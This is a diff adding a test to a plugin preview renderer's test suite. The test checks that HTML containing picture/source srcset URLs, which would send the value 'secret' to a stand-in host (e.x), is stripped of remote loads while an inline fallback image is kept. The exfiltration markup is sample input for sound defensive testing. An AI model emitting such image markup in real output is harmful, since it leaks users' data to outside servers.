@@ -61,6 +61,16 @@ describe('plugin preview renderers', () => {
     expect(out).toContain('<img src="data:image/png;base64,AAAA"')
   })
 
+  it('loads nothing remote from an answer through a picture, and keeps its fallback image', async () => {
+    const out = await html(
+      '```chart\nsecret\n```',
+      async () =>
+        '<picture><source srcset="https://e.x/a.png?d=secret"><img src="data:image/png;base64,AAAA" srcset="https://e.x/b.png 2x"></picture>',
+    )
+    expect(out).not.toMatch(/e\.x|<picture|<source|srcset/)
+    expect(out).toContain('<img src="data:image/png;base64,AAAA"')
+  })
+
   it("links nowhere but to notes from an answer, not even through a code block's source", async () => {
     const out = await html(
       '```chart\nsecret\n```',
